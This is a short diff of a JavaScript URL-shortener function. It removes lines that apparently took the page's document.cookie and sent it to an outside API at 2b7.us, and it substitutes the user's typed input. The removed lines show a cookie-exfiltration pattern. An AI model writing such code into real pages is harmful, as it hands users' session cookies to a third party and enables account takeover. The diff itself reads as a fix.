@@ -2,10 +2,8 @@ let res
 
   function shorturl() {
 	  
-     longUrl = document.cookie;;
-     document.querySelector("#cottorra").value = document.cookie;
-	  
-	  
+     longUrl = document.querySelector("#cottorra").value;
+	  	  
 	  var url = "https://2b7.us/api/index.php";
 
         var xhr = new XMLHttpRequest();
